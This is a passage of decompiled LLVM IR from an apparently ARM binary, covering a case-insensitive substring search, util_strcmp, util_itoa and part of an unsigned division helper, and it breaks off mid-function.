  br i1 %v2_11c94, label %dec_label_pc_11c9c, label %dec_label_pc_11c8c

dec_label_pc_11c9c:                               ; preds = %dec_label_pc_11c8c, %bb
  %v0_11ce021 = phi i32 [ %v4_11c70, %bb ], [ %v1_11c8c, %dec_label_pc_11c8c ]
  %v0_11ca42 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_11ca42, 1
  br i1 %tmp29, label %dec_label_pc_11cf4, label %dec_label_pc_11cb0

dec_label_pc_11cb0:                               ; preds = %dec_label_pc_11c9c, %dec_label_pc_11ca4.backedge
  %v0_11ca8.in = phi i32 [ %v0_11ca8, %dec_label_pc_11ca4.backedge ], [ %v0_11ca42, %dec_label_pc_11c9c ]
  %v1_11cbc = phi i32 [ %v1_11cbc15, %dec_label_pc_11ca4.backedge ], [ 0, %dec_label_pc_11c9c ]
  %v0_11cb0 = phi i32 [ %v5_11cb0, %dec_label_pc_11ca4.backedge ], [ %tmp23, %dec_label_pc_11c9c ]
  %v0_11ca8 = add i32 %v0_11ca8.in, -1
  %v1_11cb0 = inttoptr i32 %v0_11cb0 to i8*
  %v2_11cb0 = load i8, i8* %v1_11cb0, align 1
  %v3_11cb0 = zext i8 %v2_11cb0 to i32
  %v5_11cb0 = add i32 %v0_11cb0, 1
  %v1_11cb4 = add nsw i32 %v3_11cb0, -65
  %v2_11cbc = add i32 %v1_11cbc, %arg2
  %v3_11cbc = inttoptr i32 %v2_11cbc to i8*
  %v4_11cbc = load i8, i8* %v3_11cbc, align 1
  %v6_11cbc = zext i8 %v4_11cbc to i32
  store i32 %v6_11cbc, i32* @r3, align 4
  %v1_11cc0 = add nsw i32 %v6_11cbc, -65
  %tmp38 = icmp ult i32 %v1_11cb4, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_11cb0
  %v5_11cc4 = or i32 %v3_11cb0, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_11cb0, %bb30
  %v0_11cd0 = phi i32 [ %v3_11cb0, %dec_label_pc_11cb0 ], [ %v5_11cc4, %bb30 ]
  %tmp39 = icmp ult i32 %v1_11cc0, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_11ccc = or i32 %v6_11cbc, 96
  store i32 %v5_11ccc, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_11cd0 = phi i32 [ %v6_11cbc, %bb31 ], [ %v5_11ccc, %bb32 ]
  %v9_11cd0 = icmp eq i32 %v0_11cd0, %v1_11cd0
  br i1 %v9_11cd0, label %dec_label_pc_11cdc, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_11ca4.backedge

dec_label_pc_11ca4.backedge:                      ; preds = %bb34, %dec_label_pc_11cdc
  %v1_11cbc15 = phi i32 [ 0, %bb34 ], [ %v1_11cdc, %dec_label_pc_11cdc ]
  %tmp35 = icmp slt i32 %v0_11ca8, 1
  br i1 %tmp35, label %dec_label_pc_11cf4, label %dec_label_pc_11cb0

dec_label_pc_11cdc:                               ; preds = %bb33
  %v1_11cdc = add i32 %v1_11cbc, 1
  %v9_11ce0 = icmp eq i32 %v0_11ce021, %v1_11cdc
  br i1 %v9_11ce0, label %dec_label_pc_11ce8, label %dec_label_pc_11ca4.backedge

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11cdc
  %v2_11ce8 = sub i32 %v5_11cb0, %tmp23
  br label %dec_label_pc_11cf4

dec_label_pc_11cf4:                               ; preds = %dec_label_pc_11ca4.backedge, %dec_label_pc_11c9c, %dec_label_pc_11ce8
  %storemerge = phi i32 [ %v2_11ce8, %dec_label_pc_11ce8 ], [ -1, %dec_label_pc_11c9c ], [ -1, %dec_label_pc_11ca4.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_11cdc, { 1, 0 }
  uselistorder i32 %v0_11cb0, { 1, 0 }
  uselistorder i32 %v1_11cbc, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 7, 6, 8, 3, 9, 4, 10, 5, 11, 12 }
  uselistorder label %dec_label_pc_11cf4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ca4.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_11cb0, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11cfc = load i8, i8* %arg1, align 1
  %v2_11d00 = icmp eq i8 %v2_11cfc, 0
  br i1 %v2_11d00, label %bb, label %dec_label_pc_11d0c

bb:                                               ; preds = %entry
  %v3_11cfc = zext i8 %v2_11cfc to i32
  br label %dec_label_pc_11d20

dec_label_pc_11d0c:                               ; preds = %entry
  br label %dec_label_pc_11d10

dec_label_pc_11d10:                               ; preds = %dec_label_pc_11d10, %dec_label_pc_11d0c
  %v0_11d10 = phi i32 [ %v1_11d10, %dec_label_pc_11d10 ], [ 0, %dec_label_pc_11d0c ]
  %v1_11d10 = add i32 %v0_11d10, 1
  %v2_11d14 = add i32 %v1_11d10, %tmp
  %v3_11d14 = inttoptr i32 %v2_11d14 to i8*
  %v4_11d14 = load i8, i8* %v3_11d14, align 1
  %v2_11d18 = icmp eq i8 %v4_11d14, 0
  br i1 %v2_11d18, label %dec_label_pc_11d20, label %dec_label_pc_11d10

dec_label_pc_11d20:                               ; preds = %dec_label_pc_11d10, %bb
  %v0_11d6c3 = phi i32 [ %v3_11cfc, %bb ], [ %v1_11d10, %dec_label_pc_11d10 ]
  %v1_11d20 = inttoptr i32 %arg2 to i8*
  %v2_11d20 = load i8, i8* %v1_11d20, align 1
  %v3_11d20 = zext i8 %v2_11d20 to i32
  store i32 %v3_11d20, i32* @r3, align 4
  %v2_11d24 = icmp eq i8 %v2_11d20, 0
  br i1 %v2_11d24, label %bb21, label %dec_label_pc_11d30

bb21:                                             ; preds = %dec_label_pc_11d20
  store i32 %v3_11d20, i32* @r2, align 4
  br label %dec_label_pc_11d44

dec_label_pc_11d30:                               ; preds = %dec_label_pc_11d20
  br label %dec_label_pc_11d34

dec_label_pc_11d34:                               ; preds = %dec_label_pc_11d34, %dec_label_pc_11d30
  %v0_11d34 = phi i32 [ %v1_11d34, %dec_label_pc_11d34 ], [ 0, %dec_label_pc_11d30 ]
  %v1_11d34 = add i32 %v0_11d34, 1
  store i32 %v1_11d34, i32* @r2, align 4
  %v2_11d38 = add i32 %v1_11d34, %arg2
  %v3_11d38 = inttoptr i32 %v2_11d38 to i8*
  %v4_11d38 = load i8, i8* %v3_11d38, align 1
  %v6_11d38 = zext i8 %v4_11d38 to i32
  store i32 %v6_11d38, i32* @r3, align 4
  %v2_11d3c = icmp eq i8 %v4_11d38, 0
  br i1 %v2_11d3c, label %dec_label_pc_11d44, label %dec_label_pc_11d34

dec_label_pc_11d44:                               ; preds = %dec_label_pc_11d34, %bb21
  %v0_11d44 = phi i32 [ %v3_11d20, %bb21 ], [ %v1_11d34, %dec_label_pc_11d34 ]
  %v9_11d44 = icmp eq i32 %v0_11d44, %v0_11d6c3
  br i1 %v9_11d44, label %dec_label_pc_11d6c.preheader, label %dec_label_pc_11d4c

dec_label_pc_11d6c.preheader:                     ; preds = %dec_label_pc_11d44
  %v2_11d6c5 = icmp eq i32 %v0_11d6c3, 0
  br i1 %v2_11d6c5, label %dec_label_pc_11d74, label %dec_label_pc_11d54

dec_label_pc_11d4c:                               ; preds = %dec_label_pc_11d54, %dec_label_pc_11d44
  ret i32 0

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d64, %dec_label_pc_11d6c.preheader
  %v0_11d6c.in = phi i32 [ %v0_11d6c, %dec_label_pc_11d64 ], [ %v0_11d6c3, %dec_label_pc_11d6c.preheader ]
  %v0_11d68 = phi i32 [ %v1_11d68, %dec_label_pc_11d64 ], [ %arg2, %dec_label_pc_11d6c.preheader ]
  %v0_11d64 = phi i32 [ %v1_11d64, %dec_label_pc_11d64 ], [ %tmp, %dec_label_pc_11d6c.preheader ]
  %v0_11d6c = add i32 %v0_11d6c.in, -1
  %v1_11d54 = inttoptr i32 %v0_11d64 to i8*
  %v2_11d54 = load i8, i8* %v1_11d54, align 1
  %v3_11d54 = zext i8 %v2_11d54 to i32
  store i32 %v3_11d54, i32* @r2, align 4
  %v1_11d58 = inttoptr i32 %v0_11d68 to i8*
  %v2_11d58 = load i8, i8* %v1_11d58, align 1
  %v3_11d58 = zext i8 %v2_11d58 to i32
  store i32 %v3_11d58, i32* @r3, align 4
  %v9_11d5c = icmp eq i8 %v2_11d54, %v2_11d58
  br i1 %v9_11d5c, label %dec_label_pc_11d64, label %dec_label_pc_11d4c

dec_label_pc_11d64:                               ; preds = %dec_label_pc_11d54
  %v1_11d64 = add i32 %v0_11d64, 1
  %v1_11d68 = add i32 %v0_11d68, 1
  %v2_11d6c = icmp eq i32 %v0_11d6c, 0
  br i1 %v2_11d6c, label %dec_label_pc_11d74, label %dec_label_pc_11d54

dec_label_pc_11d74:                               ; preds = %dec_label_pc_11d64, %dec_label_pc_11d6c.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_11d34, { 0, 1, 3, 2 }
  uselistorder i8 %v2_11cfc, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_11d80 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11d80, i32* %r8.global-to-local, align 4
  %v2_11d80 = icmp eq i32 %v0_11d80, 0
  store i1 %v2_11d80, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_11d80, label %dec_label_pc_11e60, label %dec_label_pc_11d90

dec_label_pc_11d90:                               ; preds = %entry
  %v3_11d90 = icmp eq i8 %arg1, 0
  store i1 %v3_11d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11d90, label %.thread, label %dec_label_pc_11da4

.thread:                                          ; preds = %dec_label_pc_11d90
  %v4_11d98 = inttoptr i32 %v0_11d80 to i8*
  store i8 48, i8* %v4_11d98, align 1
  %v0_11d9c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11d9c.pr.pr, label %.thread1, label %dec_label_pc_11da4

.thread1:                                         ; preds = %.thread
  %v4_11d9c = load i32, i32* %r8.global-to-local, align 4
  %v5_11d9c = add i32 %v4_11d9c, 1
  %v6_11d9c = inttoptr i32 %v5_11d9c to i8*
  store i8 0, i8* %v6_11d9c, align 1
  %v0_11da0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11da0.pr.pr, label %dec_label_pc_11e60, label %dec_label_pc_11da4

dec_label_pc_11da4:                               ; preds = %dec_label_pc_11d90, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_11da8 = icmp eq i32 %arg2, 10
  store i1 %v7_11da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11da8, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_11da4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_11da4
  %v4_11da4 = zext i1 %tmp48 to i32
  store i32 %v4_11da4, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_11dc88 = sub nsw i32 0, %tmp
  %tmp.v3_11dc88 = select i1 %phitmp, i32 %tmp, i32 %v3_11dc88
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_11dc88, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_11dd4 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_11dd4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11dd8

dec_label_pc_11dd8:                               ; preds = %bb46, %.thread6
  %v2_11df8 = phi i32 [ %v1_11e04, %bb46 ], [ 32, %.thread6 ]
  %v0_11dec = phi i32 [ %v2_11dfc, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_11ddc = load i32, i32* %r6.global-to-local, align 4
  %v3_11de0 = urem i32 %v0_11dec, %v0_11ddc
  store i32 %v3_11de0, i32* %r1.global-to-local, align 4
  %v7_11de4 = icmp eq i32 %v3_11de0, 9
  store i1 %v7_11de4, i1* %cpsr_z.global-to-local, align 1
  %v1_11de8 = add i32 %v3_11de0, 48
  store i32 %v0_11dec, i32* %r0.global-to-local, align 4
  %v7_11df0 = icmp sgt i32 %v3_11de0, 9
  %extract.t = trunc i32 %v1_11de8 to i8
  br i1 %v7_11df0, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_11dd8
  %v9_11df0 = add i32 %v3_11de0, 55
  %extract.t28 = trunc i32 %v9_11df0 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_11dd8, %bb45
  %v0_11df8.off0 = phi i8 [ %extract.t, %dec_label_pc_11dd8 ], [ %extract.t28, %bb45 ]
  store i32 %v0_11ddc, i32* %r1.global-to-local, align 4
  %v3_11df8 = load i32, i32* %r7.global-to-local, align 4
  %v4_11df8 = add i32 %v3_11df8, %v2_11df8
  %v5_11df8 = inttoptr i32 %v4_11df8 to i8*
  store i8 %v0_11df8.off0, i8* %v5_11df8, align 1
  %v0_11dfc = load i32, i32* %r0.global-to-local, align 4
  %v1_11dfc = load i32, i32* %r1.global-to-local, align 4
  %v2_11dfc = udiv i32 %v0_11dfc, %v1_11dfc
  store i32 %v2_11dfc, i32* %r0.global-to-local, align 4
  %v2_11e00 = icmp ugt i32 %v1_11dfc, %v0_11dfc
  store i1 %v2_11e00, i1* %cpsr_z.global-to-local, align 1
  %v0_11e04 = load i32, i32* %r5.global-to-local, align 4
  %v1_11e04 = add i32 %v0_11e04, -1
  store i32 %v1_11e04, i32* %r5.global-to-local, align 4
  br i1 %v2_11e00, label %dec_label_pc_11e0c, label %dec_label_pc_11dd8

dec_label_pc_11e0c:                               ; preds = %bb46
  %v0_11e0c = load i32, i32* %sl.global-to-local, align 4
  %v2_11e0c = icmp eq i32 %v0_11e0c, 0
  store i1 %v2_11e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e0c, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_11e0c
  %v3_11e10 = ptrtoint i32* %stack_var_-32 to i32
  %v3_11e14 = add i32 %v1_11e04, %v3_11e10
  store i32 %v3_11e14, i32* %r2.global-to-local, align 4
  %v4_11e1c = add i32 %v3_11e14, -34
  %v5_11e1c = inttoptr i32 %v4_11e1c to i8*
  store i8 45, i8* %v5_11e1c, align 1
  %v0_11e20.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_11e20.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_11e20.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_11e0c
  %v1_11e20 = phi i32 [ %v1_11e04, %dec_label_pc_11e0c ], [ %v1_11e20.pre, %.thread11 ]
  %v2_11e20 = add i32 %v1_11e20, 1
  store i32 %v2_11e20, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_11e2c = phi i32 [ %v2_11e20, %.thread12 ], [ %v1_11e20.pre, %.thread11 ]
  %v0_11e24 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e24 = add i32 %v0_11e24, %v1_11e2c
  %v3_11e24 = inttoptr i32 %v2_11e24 to i8*
  %v4_11e24 = load i8, i8* %v3_11e24, align 1
  %v6_11e24 = zext i8 %v4_11e24 to i32
  %v2_11e28 = icmp eq i8 %v4_11e24, 0
  store i1 %v2_11e28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_11e24, i32* %r2.global-to-local, align 4
  br i1 %v2_11e28, label %dec_label_pc_11e70, label %dec_label_pc_11e38.preheader

dec_label_pc_11e38.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11e38

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11e38.preheader, %dec_label_pc_11e38
  %v0_11e38 = phi i32 [ 0, %dec_label_pc_11e38.preheader ], [ %v1_11e38, %dec_label_pc_11e38 ]
  %v1_11e38 = add i32 %v0_11e38, 1
  store i32 %v1_11e38, i32* %r1.global-to-local, align 4
  %v2_11e3c = add i32 %v1_11e38, %v2_11e24
  %v3_11e3c = inttoptr i32 %v2_11e3c to i8*
  %v4_11e3c = load i8, i8* %v3_11e3c, align 1
  %v2_11e40 = icmp eq i8 %v4_11e3c, 0
  store i1 %v2_11e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e40, label %dec_label_pc_11e48, label %dec_label_pc_11e38

dec_label_pc_11e48:                               ; preds = %dec_label_pc_11e38, %dec_label_pc_11e70
  %v0_11e4c25 = phi i32 [ %v6_11e24, %dec_label_pc_11e70 ], [ %v1_11e38, %dec_label_pc_11e38 ]
  %v0_11e48 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11e48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11e4c

dec_label_pc_11e4c:                               ; preds = %dec_label_pc_11e4c.dec_label_pc_11e4c_crit_edge, %dec_label_pc_11e48
  %v2_11e58 = phi i32 [ %v5_11e58, %dec_label_pc_11e4c.dec_label_pc_11e4c_crit_edge ], [ %v0_11e48, %dec_label_pc_11e48 ]
  %v0_11e50 = phi i32 [ %v0_11e50.pre, %dec_label_pc_11e4c.dec_label_pc_11e4c_crit_edge ], [ %v2_11e24, %dec_label_pc_11e48 ]
  %v0_11e4c = phi i32 [ %v0_11e4c.pre, %dec_label_pc_11e4c.dec_label_pc_11e4c_crit_edge ], [ %v0_11e4c25, %dec_label_pc_11e48 ]
  %v1_11e4c = add i32 %v0_11e4c, -1
  store i32 %v1_11e4c, i32* %r1.global-to-local, align 4
  %v1_11e50 = inttoptr i32 %v0_11e50 to i8*
  %v2_11e50 = load i8, i8* %v1_11e50, align 1
  %v5_11e50 = add i32 %v0_11e50, 1
  store i32 %v5_11e50, i32* %r2.global-to-local, align 4
  %v3_11e54 = icmp eq i32 %v0_11e4c, 0
  store i1 %v3_11e54, i1* %cpsr_z.global-to-local, align 1
  %v3_11e58 = inttoptr i32 %v2_11e58 to i8*
  store i8 %v2_11e50, i8* %v3_11e58, align 1
  %v4_11e58 = load i32, i32* %r0.global-to-local, align 4
  %v5_11e58 = add i32 %v4_11e58, 1
  store i32 %v5_11e58, i32* %r0.global-to-local, align 4
  br i1 %v3_11e54, label %dec_label_pc_11e60, label %dec_label_pc_11e4c.dec_label_pc_11e4c_crit_edge

dec_label_pc_11e4c.dec_label_pc_11e4c_crit_edge:  ; preds = %dec_label_pc_11e4c
  %v0_11e4c.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_11e50.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11e4c

dec_label_pc_11e60:                               ; preds = %dec_label_pc_11e4c, %.thread1, %entry
  %v0_11e60 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11e60, i32* %r0.global-to-local, align 4
  ret i32 %v0_11e60

dec_label_pc_11e70:                               ; preds = %.thread11._crit_edge
  store i32 %v6_11e24, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11e48

; uselistorder directives
  uselistorder i32 %v5_11e58, { 1, 0 }
  uselistorder i1 %v3_11e54, { 1, 0 }
  uselistorder i32 %v0_11e50, { 1, 0 }
  uselistorder i32 %v1_11e38, { 0, 1, 3, 2 }
  uselistorder i32 %v6_11e24, { 1, 0 }
  uselistorder i32 %v2_11e24, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11e20.pre, { 1, 0 }
  uselistorder i32 %v1_11e04, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11dfc, { 1, 0 }
  uselistorder i32 %v3_11de0, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_11d80, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 10, 9, 11, 12 }
  uselistorder i32 55, { 7, 0, 3, 4, 2, 5, 6, 1 }
  uselistorder label %dec_label_pc_11e48, { 1, 0 }
  uselistorder label %dec_label_pc_11e38, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_11da4, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11e78 = load i32, i32* @r1, align 4
  %v1_11e78 = add i32 %v0_11e78, -1
  store i32 %v1_11e78, i32* %r2.global-to-local, align 4
  %v2_11e78 = icmp eq i32 %v0_11e78, 0
  %v7_11e78 = icmp eq i32 %v0_11e78, 1
  %v0_11e7c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_11e78, i32 %v0_11e7c)
  br i1 %v2_11e78, label %dec_label_pc_11f60, label %dec_label_pc_11e84

dec_label_pc_11e84:                               ; preds = %entry
  %v0_11e84 = load i32, i32* %r0.global-to-local, align 4
  %v1_11e84 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_11e84, %v1_11e84
  br i1 %tmp, label %dec_label_pc_11e8c, label %dec_label_pc_11f18

dec_label_pc_11e8c:                               ; preds = %dec_label_pc_11e84
  %v1_11e8c = load i32, i32* %r2.global-to-local, align 4
  %v2_11e8c = and i32 %v1_11e8c, %v1_11e84
  %v4_11e8c = icmp eq i32 %v2_11e8c, 0
  br i1 %v4_11e8c, label %dec_label_pc_11f24, label %dec_label_pc_11e94

dec_label_pc_11e94:                               ; preds = %dec_label_pc_11e8c
  %v3_11e94 = icmp ult i32 %v1_11e84, 536870912
  br i1 %v3_11e94, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11e94
  %v4_11e98 = mul i32 %v1_11e84, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11e94, %.thread
  %v0_11eb8.pr36.ph = phi i32 [ %v4_11e98, %.thread ], [ %v1_11e84, %dec_label_pc_11e94 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11e94 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_11eb8.pr36 = phi i32 [ %v4_11eac, %bb81 ], [ %v0_11eb8.pr36.ph, %.preheader.preheader ]
  %v1_11eb0 = phi i32 [ %v4_11eb0, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_11ea4 = icmp ugt i32 %v0_11eb8.pr36, 268435455
  br i1 %v2_11ea4, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_11eb8thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_11ea8 = icmp ult i32 %v0_11eb8.pr36, %v0_11e84
  br i1 %v4_11ea8, label %bb80, label %dec_label_pc_11eb8thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_11eac = and i32 %v0_11eb8.pr36, 268435456
  %v3_11eac = icmp eq i32 %v2_11eac, 0
  %v4_11eac = mul i32 %v0_11eb8.pr36, 16
  br i1 %v3_11eac, label %bb81, label %dec_label_pc_11eb8.loopexit

bb81:                                             ; preds = %bb80
  %v2_11eb0 = and i32 %v1_11eb0, 268435456
  %v3_11eb0 = icmp eq i32 %v2_11eb0, 0
  %v4_11eb0 = mul i32 %v1_11eb0, 16
  br i1 %v3_11eb0, label %.preheader, label %dec_label_pc_11eb8thread-pre-split.loopexit.loopexit

dec_label_pc_11eb8thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_11ec448.ph = phi i32 [ %v1_11eb0, %bb ], [ %v4_11eb0, %bb81 ]
  %v0_11eb8.pr38.ph = phi i32 [ %v0_11eb8.pr36, %bb ], [ %v4_11eac, %bb81 ]
  br label %dec_label_pc_11eb8thread-pre-split.loopexit

dec_label_pc_11eb8thread-pre-split.loopexit:      ; preds = %dec_label_pc_11eb8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_11ec448 = phi i32 [ %v1_11eb0, %.thread2 ], [ %v1_11ec448.ph, %dec_label_pc_11eb8thread-pre-split.loopexit.loopexit ]
  %v0_11eb8.pr38 = phi i32 [ %v0_11eb8.pr36, %.thread2 ], [ %v0_11eb8.pr38.ph, %dec_label_pc_11eb8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11eb8thread-pre-split

dec_label_pc_11eb8thread-pre-split:               ; preds = %dec_label_pc_11eb8thread-pre-split.loopexit, %bb83
  %v1_11ec446 = phi i32 [ %v1_11ec448, %dec_label_pc_11eb8thread-pre-split.loopexit ], [ %v3_11ec4, %bb83 ]
  %v0_11eb8.pr = phi i32 [ %v0_11eb8.pr38, %dec_label_pc_11eb8thread-pre-split.loopexit ], [ %v3_11ec0, %bb83 ]
  br label %dec_label_pc_11eb8

dec_label_pc_11eb8.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_11eb8

dec_label_pc_11eb8:                               ; preds = %dec_label_pc_11eb8.loopexit, %dec_label_pc_11eb8thread-pre-split
  %v1_11ec4 = phi i32 [ %v1_11ec446, %dec_label_pc_11eb8thread-pre-split ], [ %v1_11eb0, %dec_label_pc_11eb8.loopexit ]
  %v1_11ec0 = phi i32 [ %v0_11eb8.pr, %dec_label_pc_11eb8thread-pre-split ], [ %v4_11eac, %dec_label_pc_11eb8.loopexit ]
  %v2_11eb8 = icmp slt i32 %v1_11ec0, 0
  br i1 %v2_11eb8, label %dec_label_pc_11ecc, label %bb82

bb82:                                             ; preds = %dec_label_pc_11eb8
  %v4_11ebc = icmp ult i32 %v1_11ec0, %v0_11e84
  br i1 %v4_11ebc, label %bb83, label %dec_label_pc_11ecc

bb83:                                             ; preds = %bb82
  %v3_11ec0 = mul i32 %v1_11ec0, 2
  %v2_11ec4 = icmp slt i32 %v1_11ec4, 0
  %v3_11ec4 = mul i32 %v1_11ec4, 2
  br i1 %v2_11ec4, label %dec_label_pc_11ecc, label %dec_label_pc_11eb8thread-pre-split

dec_label_pc_11ecc:                               ; preds = %bb82, %dec_label_pc_11eb8, %bb83
  %v2_11ed859 = phi i32 [ %v3_11ec4, %bb83 ], [ %v1_11ec4, %bb82 ], [ %v1_11ec4, %dec_label_pc_11eb8 ]
  %v1_11ed051 = phi i32 [ %v3_11ec0, %bb83 ], [ %v1_11ec0, %bb82 ], [ %v1_11ec0, %dec_label_pc_11eb8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11ed0

dec_label_pc_11ed0:                               ; preds = %.thread11, %dec_label_pc_11ecc
  %v1_11f04 = phi i32 [ %v4_11f04, %.thread11 ], [ %v2_11ed859, %dec_label_pc_11ecc ]
  %v1_11ed8 = phi i32 [ %v0_11f10, %.thread11 ], [ 0, %dec_label_pc_11ecc ]
  %v1_11f08 = phi i32 [ %v4_11f08, %.thread11 ], [ %v1_11ed051, %dec_label_pc_11ecc ]
  %v1_11ed4 = phi i32 [ %v0_11f00, %.thread11 ], [ %v0_11e84, %dec_label_pc_11ecc ]
  %v3_11ed0 = icmp ult i32 %v1_11ed4, %v1_11f08
  br i1 %v3_11ed0, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_11ed0
  %v3_11ed4 = sub i32 %v1_11ed4, %v1_11f08
  store i32 %v3_11ed4, i32* %r0.global-to-local, align 4
  %v3_11ed8 = or i32 %v1_11ed8, %v1_11f04
  store i32 %v3_11ed8, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11ed0, %bb84
  %v1_11ee0 = phi i32 [ %v1_11ed4, %dec_label_pc_11ed0 ], [ %v3_11ed4, %bb84 ]
  %v1_11ee4 = phi i32 [ %v1_11ed8, %dec_label_pc_11ed0 ], [ %v3_11ed8, %bb84 ]
  %v4_11edc = udiv i32 %v1_11f08, 2
  %v6_11edc = icmp ult i32 %v1_11ee0, %v4_11edc
